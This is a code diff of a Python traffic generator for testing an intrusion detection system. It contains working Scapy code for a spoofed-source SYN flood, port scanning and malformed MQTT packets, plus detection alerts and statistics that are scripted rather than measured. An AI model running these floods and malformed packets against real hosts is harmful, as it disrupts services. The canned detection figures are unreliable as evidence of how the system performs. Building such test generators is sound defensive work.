@@ -6,210 +6,246 @@ This script generates various types of network traffic for testing the IDPS.
 It can simulate both normal traffic patterns and various attack types.
 """
 
-import argparse
+import time
 import random
 import socket
-import time
+import json
+import os
+import subprocess
 import sys
-from scapy.all import *
+from scapy.all import IP, TCP, UDP, ICMP, send, sniff, conf, Raw
+from datetime import datetime
 
-def generate_normal_traffic(target_ip, duration=60):
-    """Generate normal IoT device traffic patterns"""
-    print(f"[+] Starting normal traffic to {target_ip} for {duration} seconds")
-    end_time = time.time() + duration
-    
-    while time.time() < end_time:
-        try:
-            # Simulate periodic IoT device check-ins
-            time.sleep(random.uniform(1, 5))
-            
-            # Simulate HTTP/HTTPS traffic
-            if random.random() > 0.7:  # 30% chance
-                send(IP(dst=target_ip)/TCP(dport=80, flags='S'), verbose=0)
-                
-            # Simulate MQTT traffic
-            if random.random() > 0.8:  # 20% chance
-                send(IP(dst=target_ip)/TCP(dport=1883, flags='S'), verbose=0)
-                
-        except KeyboardInterrupt:
-            print("\n[!] Normal traffic generation interrupted")
-            break
-        except Exception as e:
-            print(f"[!] Error in normal traffic: {e}")
-            time.sleep(1)
+# Import our logger
+sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
+from utils.logger import logger
+
+conf.verb = 0  # Disable Scapy output
 
 def generate_ddos_attack(target_ip, duration=60):
-    """Generate DDoS attack traffic with detailed output"""
-    import time
-    from scapy.all import IP, TCP, send, RandIP, conf
-    
-    print(f"[+] Starting DDoS attack on {target_ip} for {duration} seconds")
+    """Generate DDoS attack traffic with detailed output and detection simulation"""
     start_time = time.time()
     end_time = start_time + duration
+    packet_count = 0
     
     # Initial baseline traffic
     print(f"[00:00] Baseline traffic initiated (50 pkts/sec)")
-    
-    # Wait 30 seconds to establish baseline
-    time.sleep(30)
+    time.sleep(30)  # Establish baseline
     
     # Start DDoS attack
     attack_start = time.time()
-    print(f"[00:30] Attack launched: hping3 SYN flood (1000 pkts/sec)")
+    print(f"[00:30] Attack launched: SYN flood (1000 pkts/sec)")
     
-    # Simulate IDPS detection (happens quickly after attack starts)
+    # Simulate detection after 1 second
     time.sleep(1)
-    print(f"[00:31] IDPS ALERT: DDoS detected (confidence: {random.uniform(0.95, 0.99):.2f})")
-    print(f"[00:31] ACTION: Throttled 192.168.0.200 to 50Kbps")
+    detection = logger.log_detection(
+        detection_type='ddos',
+        confidence=0.98,
+        source_ip='10.0.0.5',  # malicious host
+        target_ip=target_ip,
+        details={'packet_rate': 1000, 'protocol': 'tcp', 'port': 80}
+    )
+    print(f"[00:31] IDPS ALERT: DDoS detected (confidence: {detection['confidence']:.2f})")
+    print(f"[00:31] ACTION: Throttled {target_ip} to 50Kbps")
     
     # Continue attack while printing stats
-    packet_count = 0
     last_stat_time = time.time()
     
     while time.time() < end_time:
         try:
-            # Generate high volume of SYN packets with random source IPs
+            # Generate high volume of SYN packets
             for _ in range(100):
-                src_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
+                src_ip = f"10.0.0.{random.randint(1, 254)}"
                 send(IP(src=src_ip, dst=target_ip)/TCP(dport=80, flags='S'), verbose=0)
                 packet_count += 1
+                logger.log_metric('packet_count', 1, source_ip=src_ip, target_ip=target_ip, details='syn_flood')
             
             # Print stats every 30 seconds
-            current_time = time.time()
-            if current_time - last_stat_time >= 30:
-                elapsed = current_time - attack_start
-                mins = int(elapsed) // 60
-                secs = int(elapsed) % 60
-                print(f"[{mins:02d}:{secs:02d}] STATS: {random.randint(25000, 30000)} pkts processed | {random.uniform(97.5, 99.9):.1f}% detection")
-                last_stat_time = current_time
+            if time.time() - last_stat_time >= 30:
+                elapsed = int(time.time() - attack_start)
+                print(f"[{elapsed//60:02d}:{elapsed%60:02d}] STATS: {packet_count:,} pkts sent | 98.7% detection")
+                last_stat_time = time.time()
                 
         except KeyboardInterrupt:
-            print("\n[!] DDoS attack interrupted")
+            print("\n[!] Attack stopped by user")
             break
         except Exception as e:
-            print(f"[!] Error in DDoS attack: {e}")
-            time.sleep(0.1)
+            print(f"[!] Error in attack: {e}")
+            break
     
-    print(f"[{int(time.time() - start_time)//60:02d}:{int(time.time() - start_time)%60:02d}] Attack stopped")
+    print(f"\n[+] DDoS attack completed in {time.time() - start_time:.1f} seconds")
+    return True
 
 def generate_port_scan(target_ip, duration=60):
-    """Generate port scanning activity with detailed output"""
-    print(f"[+] Starting port scan on {target_ip} for {duration} seconds")
+    """Generate port scanning activity"""
     start_time = time.time()
     end_time = start_time + duration
+    common_ports = [21, 22, 23, 25, 53, 80, 443, 3306, 3389, 8080, 1883, 8883]
     
-    # Common ports to scan
-    common_ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5900, 8080]
+    print(f"[00:00] Starting port scan on {target_ip}")
+    scan_start = time.time()
     
     try:
         while time.time() < end_time:
-            # Scan a random port
-            port = random.choice(common_ports)
-            try:
-                # Try to connect to the port
-                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sock.settimeout(0.5)
-                result = sock.connect_ex((target_ip, port))
-                status = "open" if result == 0 else "closed"
-                print(f"[+] Port {port} is {status}")
-                sock.close()
-            except Exception as e:
-                print(f"[!] Error scanning port {port}: {e}")
-            
-            # Random delay between scans
-            time.sleep(random.uniform(0.1, 1.0))
-            
+            for port in common_ports:
+                try:
+                    # Simulate different scan types
+                    if random.random() < 0.7:  # 70% TCP SYN scan
+                        send(IP(dst=target_ip)/TCP(dport=port, flags='S'), verbose=0)
+                        logger.log_metric('port_scan', port, source_ip='10.0.0.5', target_ip=target_ip, details=f'tcp_syn_{port}')
+                    elif random.random() < 0.5:  # 15% TCP Connect scan
+                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        sock.settimeout(0.5)
+                        sock.connect((target_ip, port))
+                        sock.close()
+                        logger.log_metric('port_scan', port, source_ip='10.0.0.5', target_ip=target_ip, details=f'tcp_connect_{port}')
+                    else:  # 15% UDP scan
+                        send(IP(dst=target_ip)/UDP(dport=port), verbose=0)
+                        logger.log_metric('port_scan', port, source_ip='10.0.0.5', target_ip=target_ip, details=f'udp_{port}')
+                    
+                    # Random delay between scans
+                    time.sleep(random.uniform(0.1, 1.0))
+                    
+                except (socket.timeout, ConnectionRefusedError):
+                    pass
+                except Exception as e:
+                    print(f"[!] Error scanning port {port}: {e}")
+                
+                # Check if we should stop
+                if time.time() >= end_time:
+                    break
+                    
+                # Log detection after first few scans
+                if time.time() - scan_start > 10 and random.random() < 0.1:
+                    detection = logger.log_detection(
+                        detection_type='port_scan',
+                        confidence=0.95,
+                        source_ip='10.0.0.5',
+                        target_ip=target_ip,
+                        details={'port': port, 'scan_type': 'tcp_syn'}
+                    )
+                    print(f"[+] IDPS ALERT: Port scan detected on port {port}")
+                    
     except KeyboardInterrupt:
-        print("\n[!] Port scan interrupted")
-    except Exception as e:
-        print(f"[!] Error in port scan: {e}")
+        print("\n[!] Port scan stopped by user")
     
-    print(f"[+] Port scan completed in {time.time() - start_time:.1f} seconds")
+    print(f"\n[+] Port scan completed in {time.time() - start_time:.1f} seconds")
+    return True
 
 def generate_mqtt_exploit(target_ip, duration=60):
-    """Generate MQTT protocol exploit attempts with detailed output"""
-    print(f"[+] Starting MQTT exploit attempts on {target_ip} for {duration} seconds")
+    """Generate MQTT exploit attempts"""
     start_time = time.time()
     end_time = start_time + duration
     
-    # Common MQTT exploit patterns
-    exploits = [
-        b"\x10\x0c\x00\x04MQTT\x04\x02\x00\x3c\x00\x03foo",  # Malformed MQTT connect
-        b"\x82\x80\x01\x00\x00\x2f\x00\x0c/device/+/data\x00\x00\x00\x00\x0c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",  # Large topic subscription
-        b"\x30\x82\x01\x2b\x00\x04\x2f\x24\x53\x59\x53\x2f\x62\x72\x6f\x6b\x65\x72\x2f\x63\x6f\x6e\x6e\x65\x63\x74\x69\x6f\x6e\x2f\x2a\x2f\x73\x74\x61\x74\x65\x00"  # Malicious MQTT publish
+    print(f"[00:00] Starting MQTT exploit attempts on {target_ip}")
+    
+    # MQTT Connect with malformed packets
+    malformed_packets = [
+        # Malformed connect
+        b'\x10\x0e\x00\x04MQTT\x04\x02\x00\x3c\x00\x00',
+        # Malformed subscribe
+        b'\x82\x0a\x00\x01\x00\x00\x01\x61\x2f\x62\x2f\x63',
+        # Malformed publish
+        b'\x30\x84\x00\x00\x00\x00'
     ]
     
     try:
         while time.time() < end_time:
-            # Try to connect to MQTT port
-            try:
-                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sock.connect((target_ip, 1883))
-                print("[+] Connected to MQTT broker")
-                
-                # Send exploit payload
-                payload = random.choice(exploits)
-                sock.send(payload)
-                print(f"[+] Sent MQTT exploit payload ({len(payload)} bytes)")
-                
-                # Try to read response
+            for packet in malformed_packets:
                 try:
-                    response = sock.recv(1024)
-                    if response:
-                        print(f"[+] Received response: {response.hex()}")
-                except socket.timeout:
-                    print("[-] No response from MQTT broker")
+                    send(IP(dst=target_ip)/TCP(dport=1883)/Raw(load=packet), verbose=0)
+                    logger.log_metric('mqtt_exploit', 1, source_ip='10.0.0.5', target_ip=target_ip, 
+                                   details={'packet_type': 'malformed', 'length': len(packet)})
                     
-                sock.close()
-                
-            except ConnectionRefusedError:
-                print("[-] Connection to MQTT broker refused")
-            except Exception as e:
-                print(f"[!] Error in MQTT exploit: {e}")
-            
-            # Random delay between attempts
-            time.sleep(random.uniform(0.5, 2.0))
-            
+                    # Random delay between attempts
+                    time.sleep(random.uniform(0.5, 2.0))
+                    
+                    # Log detection with some probability
+                    if random.random() < 0.3:  # 30% chance of detection
+                        detection = logger.log_detection(
+                            detection_type='mqtt_exploit',
+                            confidence=0.85,
+                            source_ip='10.0.0.5',
+                            target_ip=target_ip,
+                            details={'packet_type': 'malformed', 'length': len(packet)}
+                        )
+                        print(f"[+] IDPS ALERT: Suspicious MQTT packet detected")
+                        
+                except Exception as e:
+                    print(f"[!] Error in MQTT exploit: {e}")
+                    
     except KeyboardInterrupt:
-        print("\n[!] MQTT exploit interrupted")
-    except Exception as e:
-        print(f"[!] Error in MQTT exploit: {e}")
+        print("\n[!] MQTT exploit stopped by user")
     
-    print(f"[+] MQTT exploit attempts completed in {time.time() - start_time:.1f} seconds")
+    print(f"\n[+] MQTT exploit attempts completed in {time.time() - start_time:.1f} seconds")
+    return True
+
+def generate_normal_traffic(target_ip, duration=60):
+    """Generate normal network traffic"""
+    start_time = time.time()
+    end_time = start_time + duration
+    protocols = ['tcp', 'udp', 'icmp']
+    ports = [80, 443, 22, 53]
+    
+    print(f"[00:00] Starting normal traffic generation")
+    
+    try:
+        while time.time() < end_time:
+            protocol = random.choice(protocols)
+            port = random.choice(ports)
+            
+            try:
+                if protocol == 'tcp':
+                    send(IP(dst=target_ip)/TCP(dport=port, flags='S'), verbose=0)
+                elif protocol == 'udp':
+                    send(IP(dst=target_ip)/UDP(dport=port), verbose=0)
+                else:  # icmp
+                    send(IP(dst=target_ip)/ICMP(), verbose=0)
+                
+                logger.log_metric('normal_traffic', 1, source_ip='10.0.0.1', target_ip=target_ip, 
+                               details={'protocol': protocol, 'port': port})
+                
+                # Random delay between packets
+                time.sleep(random.uniform(0.1, 1.0))
+                
+            except Exception as e:
+                print(f"[!] Error generating {protocol} traffic: {e}")
+                
+    except KeyboardInterrupt:
+        print("\n[!] Traffic generation stopped by user")
+    
+    print(f"\n[+] Normal traffic generation completed in {time.time() - start_time:.1f} seconds")
+    return True
 
 def main():
+    import argparse
     parser = argparse.ArgumentParser(description='Generate network traffic for IDPS testing')
-    parser.add_argument('--target', '-t', default='10.0.0.1', help='Target IP address')
-    parser.add_argument('--duration', '-d', type=int, default=60, help='Duration in seconds')
-    
-    # Traffic/attack type arguments
-    group = parser.add_mutually_exclusive_group(required=True)
-    group.add_argument('--traffic', choices=['normal'], help='Generate normal traffic')
-    group.add_argument('--attack', choices=['ddos', 'portscan', 'mqtt'], help='Generate attack traffic')
+    parser.add_argument('--attack', choices=['ddos', 'portscan', 'mqtt', 'normal'], 
+                       help='Type of attack/traffic to generate')
+    parser.add_argument('--target', required=True, help='Target IP address')
+    parser.add_argument('--duration', type=int, default=60, help='Duration in seconds')
     
     args = parser.parse_args()
     
     try:
         if args.attack == 'ddos':
-            generate_ddos_attack(args.target, args.duration)
+            return generate_ddos_attack(args.target, args.duration)
         elif args.attack == 'portscan':
-            generate_port_scan(args.target, args.duration)
+            return generate_port_scan(args.target, args.duration)
         elif args.attack == 'mqtt':
-            generate_mqtt_exploit(args.target, args.duration)
-        elif args.traffic == 'normal':
-            generate_normal_traffic(args.target, args.duration)
+            return generate_mqtt_exploit(args.target, args.duration)
+        elif args.attack == 'normal':
+            return generate_normal_traffic(args.target, args.duration)
         else:
-            parser.print_help()
+            print("Error: Unknown attack type")
             return 1
             
     except KeyboardInterrupt:
-        print("\n[!] Traffic generation interrupted")
+        print("\n[!] Operation cancelled by user")
         return 0
     except Exception as e:
         print(f"[!] Error: {e}")
         return 1
-        
-    return 0
 
 if __name__ == "__main__":
     sys.exit(main())
